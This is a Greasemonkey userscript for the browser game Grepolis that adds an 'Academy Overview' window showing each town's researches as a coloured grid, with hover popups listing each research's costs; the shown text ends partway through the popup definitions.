// ==UserScript==
// @name        AcademyOverview
// @namespace   GrepoTools
// @namespace   GrepoTools
// @description AcademyOverview - Researches of all towns
// @downloadURL http://userscripts.org/scripts/show/185038
// @updateURL   http://userscripts.org/scripts/show/185038
// @include     http://*.grepolis.*
// @exclude     http://forum.*.grepolis.*
// @exclude     http://wiki.*.grepolis.*
// @require     http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js
// @icon        http://s3.amazonaws.com/uso_ss/icon/185038/large.png?1385676234
// @version     1.14
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_deleteValue
// @grant       GM_listValues
// @grant       GM_xmlhttpRequest
// ==/UserScript==

var w, uw = w = unsafeWindow || window,
	$ = w.jQuery;

if(location.pathname.indexOf("game")!=-1) {
	if (GM_getValue("jsonG")) {
		var jsonG = GM_getValue("jsonG").replace(/"/g, "");
	} else {
		var jsonG = "";
	}
	var GTO_researches = [];
	var GTO_Text = {};
	switch (uw.Game.market_id) {
	case "de":
		GTO_Text = {
			language: "deutsch",
			academyoverview: "Akademie-Übersicht",
		}
		break;
	default:
		GTO_Text = {
			language: "english",
			academyoverview: "Academy Overview",
		}
		break;
	};

	function GTO_createWin(GTO_Name, GTO_Width, GTO_Height, GTO_Content) {
		var GTO_Win = uw.Layout.dialogWindow.open("",GTO_Name,GTO_Width,GTO_Height,null,false)
		GTO_Win.setPosition(["center", "center"]);
		GTO_Win.appendContent(GTO_Content);
	}

	function GTO_Overview_Win() {
		var GTO_Content = $('\
		<div id="GTO_Overview_Win"></div>\
			<style type="text/css">\
				.GTOresearches {\
					width:25px;\
					height:25px;\
					margin:0 0 1px 1px;\
					float:left;\
					border:1px solid #000000;\
					background: url(http://s14.directupload.net/images/131123/p69c9qeg.png);\
				}\
				.GTOresearchtrue {\
					width:13px;\
					height:13px;\
					padding:6px;\
					margin:0 0 1px 1px;\
					float:left;\
					border:1px solid #528A18;\
				}\
				.GTOresearchtrue div {\
					width:13px;\
					height:13px;\
					background-color:#528A18;\
				}\
				.GTOresearchfalse {\
					width:13px;\
					height:13px;\
					padding:6px;\
					margin:0 0 1px 1px;\
					float:left;\
					border:1px solid #C60017;\
				}\
				.GTOresearchfalse div {\
					width:13px;\
					height:13px;\
					background-color:#C60017;\
				}\
			</style>\
			<div style="margin-bottom:5px">\
				<div style="width:880px; height:440px; overflow:hidden;">\
					<div style="width:880px; height:440px; overflow:auto;">\
						<div style="width:1074px;">\
							<div style="width:150px; height:25px; float:left;"></div>\
							<div id="GTO_research_slinger" class="GTOresearches" style="background-position:0 0"></div>\
							<div id="GTO_research_archer" class="GTOresearches" style="background-position:-25px 0"></div>\
							<div id="GTO_research_hoplite" class="GTOresearches" style="background-position:-50px 0"></div>\
							<div id="GTO_research_town_guard" class="GTOresearches" style="background-position:-75px 0"></div>\
							<div id="GTO_research_diplomacy" class="GTOresearches" style="background-position:-100px 0"></div>\
							<div id="GTO_research_espionage" class="GTOresearches" style="background-position:-125px 0"></div>\
							<div id="GTO_research_booty" class="GTOresearches" style="background-position:-150px 0"></div>\
							<div id="GTO_research_pottery" class="GTOresearches" style="background-position:-175px 0"></div>\
							<div id="GTO_research_rider" class="GTOresearches" style="background-position:-200px 0"></div>\
							<div id="GTO_research_architecture" class="GTOresearches" style="background-position:-225px 0"></div>\
							<div id="GTO_research_instructor" class="GTOresearches" style="background-position:-250px 0"></div>\
							<div id="GTO_research_bireme" class="GTOresearches" style="background-position:-275px 0"></div>\
							<div id="GTO_research_building_crane" class="GTOresearches" style="background-position:-300px 0"></div>\
							<div id="GTO_research_meteorology" class="GTOresearches" style="background-position:-325px 0"></div>\
							<div id="GTO_research_chariot" class="GTOresearches" style="background-position:-350px 0"></div>\
							<div id="GTO_research_attack_ship" class="GTOresearches" style="background-position:-375px 0"></div>\
							<div id="GTO_research_conscription" class="GTOresearches" style="background-position:-400px 0"></div>\
							<div id="GTO_research_shipwright" class="GTOresearches" style="background-position:-425px 0"></div>\
							<div id="GTO_research_demolition_ship" class="GTOresearches" style="background-position:-450px 0"></div>\
							<div id="GTO_research_catapult" class="GTOresearches" style="background-position:-475px 0"></div>\
							<div id="GTO_research_cryptography" class="GTOresearches" style="background-position:-500px 0"></div>\
							<div id="GTO_research_democracy" class="GTOresearches" style="background-position:-525px 0"></div>\
							<div id="GTO_research_colonize_ship" class="GTOresearches" style="background-position:-550px 0"></div>\
							<div id="GTO_research_small_transporter" class="GTOresearches" style="background-position:-575px 0"></div>\
							<div id="GTO_research_plow" class="GTOresearches" style="background-position:-600px 0"></div>\
							<div id="GTO_research_berth" class="GTOresearches" style="background-position:-625px 0"></div>\
							<div id="GTO_research_trireme" class="GTOresearches" style="background-position:-650px 0"></div>\
							<div id="GTO_research_phalanx" class="GTOresearches" style="background-position:-675px 0"></div>\
							<div id="GTO_research_breach" class="GTOresearches" style="background-position:-700px 0"></div>\
							<div id="GTO_research_mathematics" class="GTOresearches" style="background-position:-725px 0"></div>\
							<div id="GTO_research_ram" class="GTOresearches" style="background-position:-750px 0"></div>\
							<div id="GTO_research_cartography" class="GTOresearches" style="background-position:-775px 0"></div>\
							<div id="GTO_research_take_over" class="GTOresearches" style="background-position:-800px 0"></div>\
							<div style="clear:left;"></div>\
						</div>\
						<div style="width: 1100px; height:392px; overflow:auto;">\
							<div id="GTO_OverviewDiv" style="width:1074px;"></div>\
						</div>\
					</div>\
				</div>\
			</div>\
		');

		GTO_createWin(GTO_Text.academyoverview, 880, 500, GTO_Content, '');
		$.each(GTO_towns, function(t){
			$.each(GTO_researches, function(i){
				if (GTO_researches[i].d.town_id==GTO_towns[t].d.id) {
					$('#GTO_OverviewDiv').append('<div class="small" style="width:143px; float:left; height:17px; padding:8px 0 0 5px; overflow:hidden; border:1px solid #000000;"><a class="gp_town_link" href="#'+GTO_towns[t].d.link_fragment+'">' + uw.ITowns.getTown(GTO_researches[i].d.town_id).name + '</a></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.slinger+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.archer+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.hoplite+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.town_guard+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.diplomacy+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.espionage+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.booty+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.pottery+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.rider+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.architecture+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.instructor+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.bireme+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.building_crane+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.meteorology+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.chariot+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.attack_ship+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.conscription+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.shipwright+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.demolition_ship+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.catapult+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.cryptography+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.democracy+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.colonize_ship+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.small_transporter+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.plow+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.berth+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.trireme+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.phalanx+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.breach+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.mathematics+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.ram+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.cartography+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div class="GTOresearch'+GTO_researches[i].d.take_over+'"><div></div></div>');
					$('#GTO_OverviewDiv').append('<div style="clear:left;"></div>');
				}
			});
		});
		$("#GTO_research_archer").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.archer.name+'</h4><p>'+uw.GameData.researches.archer.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.archer.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.archer.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.archer.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.archer.research_points+'</p></div>'));
		/*<img alt="" src="http://de.cdn.grepolis.com/images/game/res/time.png" height="30" width="30">'+uw.readableSeconds(uw.GameData.researches.archer.required_time,0,0,0)+'*/
		$("#GTO_research_architecture").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.architecture.name+'</h4><p>'+uw.GameData.researches.architecture.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.architecture.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.architecture.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.architecture.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.architecture.research_points+'</p></div>'));
		$("#GTO_research_attack_ship").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.attack_ship.name+'</h4><p>'+uw.GameData.researches.attack_ship.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.attack_ship.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.attack_ship.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.attack_ship.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.attack_ship.research_points+'</p></div>'));
		$("#GTO_research_berth").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.berth.name+'</h4><p>'+uw.GameData.researches.berth.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.berth.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.berth.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.berth.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.berth.research_points+'</p></div>'));
		$("#GTO_research_bireme").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.bireme.name+'</h4><p>'+uw.GameData.researches.bireme.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.bireme.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.bireme.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.bireme.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.bireme.research_points+'</p></div>'));
		$("#GTO_research_booty").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.booty.name+'</h4><p>'+uw.GameData.researches.booty.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.booty.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.booty.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.booty.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.booty.research_points+'</p></div>'));
		$("#GTO_research_breach").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.breach.name+'</h4><p>'+uw.GameData.researches.breach.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.breach.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.breach.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.breach.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.breach.research_points+'</p></div>'));
		$("#GTO_research_building_crane").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.building_crane.name+'</h4><p>'+uw.GameData.researches.building_crane.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.building_crane.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.building_crane.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.building_crane.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.building_crane.research_points+'</p></div>'));
		$("#GTO_research_cartography").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.cartography.name+'</h4><p>'+uw.GameData.researches.cartography.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.cartography.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.cartography.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.cartography.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.cartography.research_points+'</p></div>'));
		$("#GTO_research_catapult").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.catapult.name+'</h4><p>'+uw.GameData.researches.catapult.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.catapult.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.catapult.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.catapult.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.catapult.research_points+'</p></div>'));
		$("#GTO_research_chariot").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.chariot.name+'</h4><p>'+uw.GameData.researches.chariot.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.chariot.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.chariot.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.chariot.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.chariot.research_points+'</p></div>'));
		$("#GTO_research_colonize_ship").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.colonize_ship.name+'</h4><p>'+uw.GameData.researches.colonize_ship.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.colonize_ship.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.colonize_ship.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.colonize_ship.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.colonize_ship.research_points+'</p></div>'));
		$("#GTO_research_conscription").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.conscription.name+'</h4><p>'+uw.GameData.researches.conscription.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.conscription.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.conscription.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.conscription.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.conscription.research_points+'</p></div>'));
		$("#GTO_research_cryptography").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.cryptography.name+'</h4><p>'+uw.GameData.researches.cryptography.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.cryptography.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.cryptography.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.cryptography.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.cryptography.research_points+'</p></div>'));
		$("#GTO_research_democracy").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.democracy.name+'</h4><p>'+uw.GameData.researches.democracy.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.democracy.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.democracy.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.democracy.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.democracy.research_points+'</p></div>'));
		$("#GTO_research_demolition_ship").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.demolition_ship.name+'</h4><p>'+uw.GameData.researches.demolition_ship.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.demolition_ship.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.demolition_ship.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.demolition_ship.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.demolition_ship.research_points+'</p></div>'));
		$("#GTO_research_diplomacy").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.diplomacy.name+'</h4><p>'+uw.GameData.researches.diplomacy.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.diplomacy.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.diplomacy.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.diplomacy.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.diplomacy.research_points+'</p></div>'));
		$("#GTO_research_espionage").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.espionage.name+'</h4><p>'+uw.GameData.researches.espionage.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.espionage.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.espionage.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.espionage.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.espionage.research_points+'</p></div>'));
		$("#GTO_research_hoplite").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.hoplite.name+'</h4><p>'+uw.GameData.researches.hoplite.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.hoplite.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.hoplite.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.hoplite.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.hoplite.research_points+'</p></div>'));
		$("#GTO_research_instructor").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.instructor.name+'</h4><p>'+uw.GameData.researches.instructor.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.instructor.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.instructor.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.instructor.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.instructor.research_points+'</p></div>'));
		$("#GTO_research_mathematics").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.mathematics.name+'</h4><p>'+uw.GameData.researches.mathematics.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.mathematics.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.mathematics.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.mathematics.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.mathematics.research_points+'</p></div>'));
		$("#GTO_research_meteorology").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.meteorology.name+'</h4><p>'+uw.GameData.researches.meteorology.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.meteorology.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.meteorology.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.meteorology.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.meteorology.research_points+'</p></div>'));
		$("#GTO_research_phalanx").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.phalanx.name+'</h4><p>'+uw.GameData.researches.phalanx.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.phalanx.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.phalanx.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.phalanx.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.phalanx.research_points+'</p></div>'));
		$("#GTO_research_plow").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.plow.name+'</h4><p>'+uw.GameData.researches.plow.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.plow.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.plow.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.plow.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.plow.research_points+'</p></div>'));
		$("#GTO_research_pottery").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.pottery.name+'</h4><p>'+uw.GameData.researches.pottery.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.pottery.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.pottery.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.pottery.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.pottery.research_points+'</p></div>'));
		$("#GTO_research_ram").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.ram.name+'</h4><p>'+uw.GameData.researches.ram.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.ram.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.ram.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.ram.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.ram.research_points+'</p></div>'));
		$("#GTO_research_rider").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.rider.name+'</h4><p>'+uw.GameData.researches.rider.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.rider.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.rider.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.rider.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.rider.research_points+'</p></div>'));
		$("#GTO_research_shipwright").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.shipwright.name+'</h4><p>'+uw.GameData.researches.shipwright.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.shipwright.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.shipwright.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.shipwright.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.shipwright.research_points+'</p></div>'));
